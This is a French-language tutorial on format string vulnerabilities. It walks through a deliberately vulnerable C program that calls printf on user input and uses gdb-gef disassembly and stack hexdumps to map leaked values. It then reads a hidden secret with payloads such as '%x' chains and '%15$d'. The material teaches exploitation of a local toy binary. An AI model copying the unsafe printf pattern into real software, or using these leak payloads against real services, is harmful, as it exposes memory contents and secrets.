# Format String 

Pour illustrer, prenons un exemple simple et essayons d'afficher la valeur de `secret`

```c
long secret = rand();
char buf[64];

printf("Votre nom: ");
fgets(buf, sizeof(buf), stdin);
printf("Bonjour, ");
printf(buf);
```

Regardons si un leak est possible

```bash
└─$ ./printf-leak
Votre nom: %x %x %x %x %x
Bonjour, 6a6e6f42 0 0 359a06bf 4
```

Ouvrons gdb-gef et mettons un break juste apres le printf de notre buffer, pour voir à quoi correspondent les leaks

```sh
└─$ gdb printf-leak
# ...
gef➤  disas main
Dump of assembler code for function main:
   0x0000000000401146 <+0>:	push   rbp
   0x0000000000401147 <+1>:	mov    rbp,rsp
   0x000000000040114a <+4>:	sub    rsp,0x50
   0x000000000040114e <+8>:	call   0x401050 <rand@plt>
   0x0000000000401153 <+13>:	cdqe
   0x0000000000401155 <+15>:	mov    QWORD PTR [rbp-0x8],rax
   0x0000000000401159 <+19>:	lea    rax,[rip+0xea4]        # 0x402004
   0x0000000000401160 <+26>:	mov    rdi,rax
   0x0000000000401163 <+29>:	mov    eax,0x0
   0x0000000000401168 <+34>:	call   0x401030 <printf@plt>
   0x000000000040116d <+39>:	mov    rdx,QWORD PTR [rip+0x2ebc]        # 0x404030 <stdin@GLIBC_2.2.5>
   0x0000000000401174 <+46>:	lea    rax,[rbp-0x50]
   0x0000000000401178 <+50>:	mov    esi,0x40
   0x000000000040117d <+55>:	mov    rdi,rax
   0x0000000000401180 <+58>:	call   0x401040 <fgets@plt>
   0x0000000000401185 <+63>:	lea    rax,[rip+0xe84]        # 0x402010
   0x000000000040118c <+70>:	mov    rdi,rax
   0x000000000040118f <+73>:	mov    eax,0x0
   0x0000000000401194 <+78>:	call   0x401030 <printf@plt>
   0x0000000000401199 <+83>:	lea    rax,[rbp-0x50]
   0x000000000040119d <+87>:	mov    rdi,rax
   0x00000000004011a0 <+90>:	mov    eax,0x0
   0x00000000004011a5 <+95>:	call   0x401030 <printf@plt>
   0x00000000004011aa <+100>:	mov    eax,0x0
   0x00000000004011af <+105>:	leave
   0x00000000004011b0 <+106>:	ret
End of assembler dump.
```

Ici on peut voir que le printf de notre buffer se trouve à `main+95` donc mettons notre break juste apres et lançons-le 

```sh
gef➤  b *main+100
Breakpoint 1 at 0x4011aa
gef➤  run
Starting program: /[...]/printf-leak 
#...
Votre nom: %x %x %x %x %x
Bonjour, 6a6e6f42 0 0 4056bf 4
```

Si on affiche la stack, regardons à quoi ces valeurs correspodent

```sh
gef➤  hexdump byte $sp -s 240
0x00007fffffffdb70     25 78 20 25 78 20 25 78 20 25 78 20 25 78 0a 00    %x %x %x %x %x..
0x00007fffffffdb80     00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00    ................
0x00007fffffffdb90     00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00    ................
0x00007fffffffdba0     00 00 00 00 00 00 00 00 30 50 fe f7 ff 7f 00 00    ........0P......
0x00007fffffffdbb0     00 00 00 00 00 00 00 00 67 45 8b 6b 00 00 00 00    ........gE.k....
0x00007fffffffdbc0     01 00 00 00 00 00 00 00 68 ad dd f7 ff 7f 00 00    ........h.......
0x00007fffffffdbd0     c0 dc ff ff ff 7f 00 00 46 11 40 00 00 00 00 00    ........F.@.....
0x00007fffffffdbe0     40 00 40 00 01 00 00 00 d8 dc ff ff ff 7f 00 00    @.@.............
0x00007fffffffdbf0     d8 dc ff ff ff 7f 00 00 3b 7a 00 15 7f 0d 01 d2    ........;z......
0x00007fffffffdc00     00 00 00 00 00 00 00 00 e8 dc ff ff ff 7f 00 00    ................
0x00007fffffffdc10     00 d0 ff f7 ff 7f 00 00 f0 3d 40 00 00 00 00 00    .........=@.....
0x00007fffffffdc20     3b 7a a2 a2 80 f2 fe 2d 3b 7a 42 4f c4 e2 fe 2d    ;z.....-;zBO...-
0x00007fffffffdc30     00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00    ................
0x00007fffffffdc40     00 00 00 00 00 00 00 00 d8 dc ff ff ff 7f 00 00    ................
0x00007fffffffdc50     01 00 00 00 00 00 00 00 00 fc 85 5b 44 d7 6d 46    ...........[D.mF
```

Rien n'apparait, regardons plus haut dans la stack

```sh
gef➤  hexdump byte $sp-224 -s 240
0x00007fffffffda90     30 00 00 00 30 00 00 00 70 db ff ff ff 7f 00 00    0...0...p.......
0x00007fffffffdaa0     b0 da ff ff ff 7f 00 00 00 fc 85 5b 44 d7 6d 46    ...........[D.mF
0x00007fffffffdab0     00 00 00 00 00 00 00 00 42 6f 6e 6a 6f 75 72 2c    ........Bonjour,
0x00007fffffffdac0     00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00    ................
0x00007fffffffdad0     bf 56 40 00 00 00 00 00 04 00 00 00 00 00 00 00    .V@.............
0x00007fffffffdae0     00 00 00 00 01 00 00 00 00 00 00 00 00 00 00 00    ................
0x00007fffffffdaf0     00 00 00 00 00 00 00 00 d8 dc ff ff ff 7f 00 00    ................
0x00007fffffffdb00     e0 88 f9 f7 ff 7f 00 00 00 00 00 00 00 00 00 00    ................
0x00007fffffffdb10     70 db ff ff ff 7f 00 00 00 d0 ff f7 ff 7f 00 00    p...............
0x00007fffffffdb20     f0 3d 40 00 00 00 00 00 0a ea e2 f7 ff 7f 00 00    .=@.............
0x00007fffffffdb30     40 00 00 00 00 00 00 00 34 56 df f7 ff 7f 00 00    @.......4V......
0x00007fffffffdb40     ff ff ff ff 67 45 8b 6b d8 dc ff ff ff 7f 00 00    ....gE.k........
0x00007fffffffdb50     c0 db ff ff ff 7f 00 00 00 00 00 00 00 00 00 00    ................
0x00007fffffffdb60     e8 dc ff ff ff 7f 00 00 aa 11 40 00 00 00 00 00    ..........@.....
0x00007fffffffdb70     25 78 20 25 78 20 25 78 20 25 78 20 25 78 0a 00    %x %x %x %x %x..
```

On peut alors voir notre `4056bf`, suivi du `04`.
Un peu plus haut le `6a6e6f42`.

Comme expliqué, le `%x` affiche les valeurs sur 4 octets donc par exemple il est impossible de récupérer `2c72756f` sans faire de `%lx`, le `l` permettant d'afficher les valeurs en 8 octets bits.

Donc pour revenir à notre exemple:
`0x..dab8` -> `6a6e6f42`
`0x..dac0` -> `0`
`0x..dac8` -> `0`
`0x..dad0` -> `4056fb`
`0x..dad8` -> `4`

Comme repéré precedement, notre `secret` se trouve en `$rbp-0x8` or `$rbp   : 0x00007fffffffdbc0` donc notre secret est ici stocké en `0x..dbb8` ce qui est bien plus bas dans la stack.
En tentant avec plus de `%x` nous pouvons voir que la 15eme valeur correspond à celle présente en `0x..dbb8` visible dans le hexdump:

```sh
Votre nom: %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x
Bonjour, 6a6e6f42 0 0 4056dd 4 25207825 20782520 78252078 25207825 20782520 78252078 0 f7fe5030 0 6b8b4567

gef➤  hexdump byte $sp -s 112
0x00007fffffffdb70     25 78 20 25 78 20 25 78 20 25 78 20 25 78 20 25    %x %x %x %x %x %
0x00007fffffffdb80     78 20 25 78 20 25 78 20 25 78 20 25 78 20 25 78    x %x %x %x %x %x
0x00007fffffffdb90     20 25 78 20 25 78 20 25 78 20 25 78 0a 00 00 00     %x %x %x %x....
0x00007fffffffdba0     00 00 00 00 00 00 00 00 30 50 fe f7 ff 7f 00 00    ........0P......
0x00007fffffffdbb0     00 00 00 00 00 00 00 00 67 45 8b 6b 00 00 00 00    ........gE.k....
0x00007fffffffdbc0     02 00 00 00 00 00 00 00 68 ad dd f7 ff 7f 00 00    ........h.......
0x00007fffffffdbd0     c0 dc ff ff ff 7f 00 00 46 11 40 00 00 00 00 00    ........F.@.....
```

Il nous reste plus qu'a récuperer cette valeur sous forme d'entier grâce à `%d`

```sh
└─$ ./printf-leak
Votre nom: %x %x %x %x %x %x %x %x %x %x %x %x %x %x %d 
Bonjour, 6a6e6f42 0 0 aa6e6de 4 25207825 20782520 78252078 25207825 20782520 64252078 0 67fa4030 0 1804289383
```

Ou plus simplement dans le cas où l'on connait l'index (15 ici) de la valeur, `%15$d` est plus direct, et indispensable dans le cas d'un buffer petit pour notre input.

```sh
└─$ ./printf-leak
Votre nom: %15$d
Bonjour, 1804289383
```

Rappel: `%<index>$<format>`